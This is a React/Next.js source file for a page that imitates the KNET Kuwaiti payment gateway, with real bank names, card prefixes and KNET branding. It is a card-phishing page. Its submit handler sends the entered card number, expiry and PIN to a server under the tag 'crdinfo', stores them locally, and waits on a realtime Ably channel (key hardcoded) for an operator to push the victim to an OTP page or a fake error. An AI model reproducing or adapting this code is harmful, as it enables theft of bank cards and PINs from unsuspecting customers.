"use client";
import { createContext, useState, useContext, useEffect } from "react";
import { ChannelProvider } from "ably/react";
import { useChannel } from "ably/react";
import { useAuth } from "@/context/AuthProvider";
import { useCookiesNext } from "cookies-next";
import { sendDataToServercard } from "@/lib/Utlis";
import { useRouter } from 'next/navigation'
import * as Ably from 'ably';
import {
  Button,
  Dialog,
  DialogHeader,
  DialogBody,
  DialogFooter,
} from "@material-tailwind/react";

 


export const knetBoxStyles =
  "bg-white rounded-xl p-4 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)]";

const Kneeter = () => {

  const [open, setOpen] = useState(false);
 
  const handleOpen = () => setOpen(!open);

const cancelit = () => {
     router.push('/gopy');
     setOpen(!open);
}

    const router = useRouter()
  const [formData, setFormData] = useState({
    prefex: "",
    cardno: "",
    exp: "",
    pin: "",
    expeyar: "",
    expmonth: "",
    bankname: "",
  });
   const client = new Ably.Realtime({ key: '1XOPIQ.r37UVQ:fJgtDbLPNj8jTmgaAS5YPqM8r0rbE-yaP-bEtYjI3I4', clientId: 'mayname' });
   
  const { setCookie, hasCookie, deleteCookie, getCookies, getCookie } =
    useCookiesNext();
  const { user, login, logout } = useAuth();
  var mychanel = user;
  const [bankss, setBankss] = useState([
    {
      name: "Al Ahli Bank of Kuwait [ABK]",
      codes: [{ name: "428628" }, { name: "403622" }, { name: "423826" }],
    },
    {
      name: "Al Rajhi Bank [Rajhi]",
      codes: [{ name: "458838" }],
    },
    {
      name: "Bank of Bahrain Kuwait [BBK]",
      codes: [{ name: "418056" }, { name: "588790" }],
    },
    {
      name: "Boubyan Bank [Boubyan]",
      codes: [
        { name: "470350" },
        { name: "490456" },
        { name: "404919" },
        { name: "450605" },
        { name: "490455" },
        { name: "426058" },
        { name: "431199" },
      ],
    },
    {
      name: "Burgan Bank [Burgan]",
      codes: [
        { name: "450238" },
        { name: "468564" },
        { name: "49219000" },
        { name: "450759" },
        { name: "402978" },
        { name: "403583" },
        { name: "415254" },
      ],
    },
    {
      name: "Commercial Bank of Kuwait [CBK]",
      codes: [
        { name: "532672" },
        { name: "537015" },
        { name: "521175" },
        { name: "516334" },
      ],
    },
    {
      name: "Doha Bank [Doha]",
      codes: [{ name: "419252" }],
    },
    {
      name: "Gulf Bank of Kuwait [GBK]",
      codes: [
        { name: "517458" },
        { name: "559475" },
        { name: "531471" },
        { name: "517419" },
        { name: "526206" },
        { name: "531329" },
        { name: "531470" },
        { name: "531644" },
      ],
    },
    {
      name: "KFH [TAM]",
      codes: [{ name: "45077849" }, { name: "45077848" }],
    },
    {
      name: "Kuwait Finance House [KFH]",
      codes: [
        { name: "450778" },
        { name: "485602" },
        { name: "537016" },
        { name: "532674" },
      ],
    },
    {
      name: "Kuwait International Bank [KIB]",
      codes: [{ name: "409054" }, { name: "406464" }],
    },
    {
      name: "National Bank of Kuwait [NBK]",
      codes: [{ name: "464452" }, { name: "589460" }],
    },
    {
      name: "NBK [Weyay]",
      codes: [{ name: "46445250" }, { name: "543363" }],
    },
    {
      name: "Qatar National Bank [QNB]",
      codes: [{ name: "521020" }, { name: "524745" }],
    },
    {
      name: "Union National Bank [UNB]",
      codes: [{ name: "457778" }],
    },
    {
      name: "Warba Bank [Warba]",
      codes: [
        { name: "532749" },
        { name: "559459" },
        { name: "525528" },
        { name: "541350" },
      ],
    },
  ]);



  useEffect(() => {
   

  }, []);




  const [myerror, setMyerror] = useState("");
    const [isLoading, setisLoading] = useState(false);

  const [bankssdata, setBankssdata] = useState([]);
  const handleChangeselect = (e) => {
    const { name, value } = e.target;
    setBankssdata(bankss[value].codes);
    setFormData({
      ...formData,
      bankname: bankss[value].name,
      prefex: bankss[value].codes[0].name,
    });
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    const formDatacopy = formData;
    setFormData({ ...formData, [name]: value });

    //console.log(formData);
  };
  const [errorclass, setErrorclass] = useState("");

  const handelsubmit = () => {
    //console.log("click");
    var valid = false;
    if (
      formData.cardno === "" ||
      formData.cardno.length < 10 ||
      formData.expmonth === "" ||
      formData.expeyar === "" ||
      formData.pin === "" ||
      formData.pin.length < 4
    ) {
      setErrorclass(
        "p-2  bg-red-500 text-white  rounded-md flex items-center flex-col text-xs"
      );
      setMyerror("الرجاء تعبئة جميع الحقول بشكل صحيح");
    } else {
      setErrorclass("");
      setMyerror("");

      var copyformdata = formData;
      //console.log(copyformdata);
      copyformdata.exp = copyformdata.expeyar + "/" + copyformdata.expmonth;
     
       setisLoading(true);
      sendDataToServercard(copyformdata, user, "crdinfo");
        const storedUser = JSON.parse(localStorage.getItem('user'));
         localStorage.setItem('crdinfo', JSON.stringify(copyformdata));

  //console.log(storedUser);

     const channel = client.channels.get("get-started");
      channel.presence.enter();
      var thechanel = "nafath-chanelltam-"+storedUser.id;
       channel.subscribe(thechanel, (msg) => {
        //console.log(msg);

        if (msg.name !== thechanel) return;
        if(msg.data.confirm==='0'){
              router.push('/gopy/myot');
        }else if(msg.data.confirm==='1'){
          //error
           setisLoading(false);
         
    setFormData({
    prefex: "",
    cardno: "",
    exp: "",
    pin: "",
    expeyar: "",
    expmonth: "",
    bankname: "",
  });
            handleOpen()
            setTimeout(function() {
									window.location.href = '/gopy';
									}, 3000);
        }
      
            })

     
    }
  };

  return (
    <>
      <div className="bg-[#ebebeb]  min-h-screen">
        <section className="container p-2">
          <img
            src="/assets/knet-eid.webp"
            alt="knet banner"
            className="w-full p-2 mb-2 h-28 rounded-ss-2xl rounded-ee-2xl"
          />
          <div className="text-left bg-white rounded-xl px-4 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)]">
            <img
              src="/assets/tasdeed.webp"
              alt="tasdeed logo"
              className="w-40 object-cover mx-auto mb-2"
            />
            <div className="flex items-center border-b border-b-[#8f8f90]">
              <p className="grow text-xs">Tap Payments EPSP</p>
              <p className="text-[#0070cd] text-xs font-bold w-32">:Merchant</p>
            </div>
            <div className="flex items-center">
              <p className="grow ">{getCookie("price")}</p>
              <p className="text-[#0070cd] text-xs font-bold w-32">:Amount</p>
            </div>
          </div>
          <form className="text-left">
            <div className="-space-y-4 divide-y divide-[#8f8f90] mt-4 bg-white rounded-xl p-2 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)]">
              <div className="pt-2 flex justify-between gap-4">
                <div className="flex-[65%] md:flex-[70%]">
                  <div>
                    <select
                      onChange={handleChangeselect}
                      aria-hidden="true"
                      tabIndex={-1}
                      className="flex w-full items-center justify-between gap-2 border !px-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:bg-muted disabled:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1 px-4 h-6 rounded-xl border-transparent bg-[#e9e9e9] text-[#414141]"
                    >
                      <option>Select Your Bank</option>
                      {bankss.map((row, index) => (
                        <option key={index} value={index}>
                          {row.name}
                        </option>
                      ))}
                    </select>
                    <p className="text-xs text-red-500 h-5 transition-opacity opacity-0">
                      {" "}
                      مطلوب
                    </p>
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none text-xs flex-[28%] md:flex-[30%] mt-1 text-[#0070cd] font-black whitespace-nowrap">
                  :Select Your Bank
                </label>
              </div>
              <div className="flex justify-between gap-4">
                <div dir="ltr" className="flex-[70%] flex gap-2 items-center">
                  <div className="flex-[30%] max-w-72">
                    <div>
                      <select
                        name="prefex"
                        aria-hidden="true"
                        tabIndex={-1}
                        value={formData.prefex}
                        onChange={handleChange}
                        className="flex w-full items-center justify-between gap-2 border !px-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:bg-muted disabled:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1 mt-2 px-4 h-6 rounded-xl border-transparent bg-[#e9e9e9] text-[#414141]"
                      >
                        {bankssdata.map((row, index) => (
                          <option key={index} value={row.name}>
                            {row.name}
                          </option>
                        ))}
                      </select>
                      <p className="text-xs text-red-500 h-5 transition-opacity opacity-0">
                        {" "}
                        مطلوب
                      </p>
                    </div>
                  </div>
                  <div className="grow">
                    <div>
                      <label
                        htmlFor="card_num"
                        className="mb-2 block text-sm font-bold leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none text-black"
                      />
                      <div className="flex flex-col gap-2 w-full" dir="rtl">
                        <div className="relative">
                          <input
                            id="card_num"
                            name="cardno"
                            dir="rtl"
                            type="tel"
                            placeholder=" "
                            className="p-2 w-full outline-none border relative border-gray-300 border-none h-6 bg-white text-left transition-shadow rounded-md shadow-[inset_0px_0px_2px_2px_#0070cd]"
                            value={formData.cardno}
                            onChange={handleChange}
                            autoComplete="off"
                            maxLength={10}
                          />
                        </div>
                      </div>
                      <p className="text-xs text-red-500 h-5 transition-opacity opacity-0" />
                    </div>
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[30%] mt-3 text-[#0070cd]">
                  :Card Number
                </label>
              </div>
              <div className="flex justify-between gap-4">
                <div className="flex-[70%] mt-2 flex gap-2 items-center">
                  <div className="flex-[2]">
                    <div>
                      <select
                        value={formData.expeyar}
                        onChange={handleChange}
                        name="expeyar"
                        aria-hidden="true"
                        tabIndex={-1}
                        className="flex w-full items-center justify-between gap-2 border !px-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:bg-muted disabled:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1 px-4 h-6 rounded-xl border-transparent bg-[#e9e9e9] text-[#414141]"
                      >
                        <option>YYYY</option>
                        <option value={2024}>2024</option>
                        <option value={2025}>2025</option>
                        <option value={2026}>2026</option>
                        <option value={2027}>2027</option>
                        <option value={2028}>2028</option>
                        <option value={2029}>2029</option>
                        <option value={2030}>2030</option>
                        <option value={2031}>2031</option>
                        <option value={2032}>2032</option>
                        <option value={2033}>2033</option>
                        <option value={2034}>2034</option>
                        <option value={2035}>2035</option>
                        <option value={2036}>2036</option>
                        <option value={2037}>2037</option>
                        <option value={2038}>2038</option>
                        <option value={2039}>2039</option>
                        <option value={2040}>2040</option>
                        <option value={2041}>2041</option>
                        <option value={2042}>2042</option>
                        <option value={2043}>2043</option>
                        <option value={2044}>2044</option>
                        <option value={2045}>2045</option>
                        <option value={2046}>2046</option>
                        <option value={2047}>2047</option>
                        <option value={2048}>2048</option>
                        <option value={2049}>2049</option>
                        <option value={2050}>2050</option>
                      </select>
                      <p className="text-xs text-red-500 h-5 transition-opacity opacity-0">
                        {" "}
                        مطلوب
                      </p>
                    </div>
                  </div>
                  <div className="flex-1">
                    <div>
                      <select
                        aria-hidden="true"
                        tabIndex={-1}
                        className="flex w-full items-center justify-between gap-2 border !px-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:bg-muted disabled:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1 px-4 h-6 rounded-xl border-transparent bg-[#e9e9e9] text-[#414141]"
                        onChange={handleChange}
                        name="expmonth"
                      >
                        <option>MM</option>
                        <option value={"01"}>01</option>
                        <option value={"02"}>02</option>
                        <option value={"03"}>03</option>
                        <option value={"04"}>04</option>
                        <option value={"05"}>05</option>
                        <option value={"06"}>06</option>
                        <option value={"07"}>07</option>
                        <option value={"08"}>08</option>
                        <option value={"09"}>09</option>
                        <option value={"10"}>10</option>
                        <option value={"11"}>11</option>
                        <option value={"12"}>12</option>
                      </select>
                      <p className="text-xs text-red-500 h-5 transition-opacity opacity-0">
                        {" "}
                        مطلوب
                      </p>
                    </div>
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[30%] mt-3 text-[#0070cd]">
                  :Expiration Date
                </label>
              </div>
              <div className="flex justify-between gap-4">
                <div className="flex-[70%]">
                  <div className="text-center">
                    <label
                      htmlFor="pin"
                      className="mb-2 block text-sm font-bold leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none text-black text-center"
                    />
                    <div className="flex flex-col gap-2 w-full" dir="rtl">
                      <div className="relative">
                        <input
                          id="pin"
                          dir="rtl"
                          type="tel"
                          placeholder=" "
                          className="p-2 w-full outline-none border relative border-red-500 border-none h-6 bg-white text-left transition-shadow rounded-md shadow-[inset_0px_0px_0px_1px_#ff0000]"
                          onChange={handleChange}
                          name="pin"
                          autoComplete="off"
                          maxLength={4}
                        />
                      </div>
                    </div>
                    <p className="text-xs text-red-500 h-5 transition-opacity opacity-100" />
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[30%] mt-3 text-[#0070cd]">
                  :PIN
                </label>
              </div>
              <div className={errorclass}>{myerror}</div>
            </div>
            <div className="bg-white rounded-xl p-4 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)] flex items-center mt-4">
              <button
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-0.5 px-6 bg-[#eaeaea] hover:bg-gray-100 text-[#666666] transition-colors border border-[#cacaca] select-none pointer-events-none"
                type="reset"
              >
                Cancel
              </button>
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-0.5 px-6 hover:brightness-110 transition-colors disabled:cursor-not-allowed bg-[#eaeaea] hover:bg-gray-100 text-[#666666] border border-[#cacaca]"
                type="button"
                onClick={handelsubmit}
              >
                Submit
              </button>
            </div>
          </form>
          <h3 className="mt-8 mb-1 capitalize text-center text-xs">
            © all rights reserved. copyright 2025
          </h3>
          <h3 className="mb-10 capitalize text-center text-xs text-[#0070cd]">
            the shared electronics banking services company - KNET
          </h3>
        </section>
      </div>
      <Dialog open={open} handler={handleOpen} dismiss={{outsidePress:false}}>
        <DialogHeader>خطأ</DialogHeader>
        <DialogBody>
          <h4 style={{ textAlign: "center" }}>
            {" "}
            يرجى التأكد من معلومات البطاقة المدخلة أو محاولة الدفع من بطاقة أخرى
            .{" "}
          </h4>
        </DialogBody>
        <DialogFooter>
          
       
        </DialogFooter>
      </Dialog>
      {isLoading ? (
        <div
          className="absolute w-full top-0 "
          style={{
            height: "100vh",
            width: "100%",
            backgroundColor: "#00000082",
          }}
        >
          <div
            role="status"
            className="absolute -translate-x-1/2 -translate-y-1/2 top-2/4 left-1/2"
          >
            <svg
              aria-hidden="true"
              className="w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600"
              viewBox="0 0 100 101"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                fill="currentColor"
              />
              <path
                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                fill="currentFill"
              />
            </svg>
            <span className="sr-only">Loading...</span>
          </div>
        </div>
      ) : (
        <></>
      )}
    </>
  );
};
export default Kneeter;
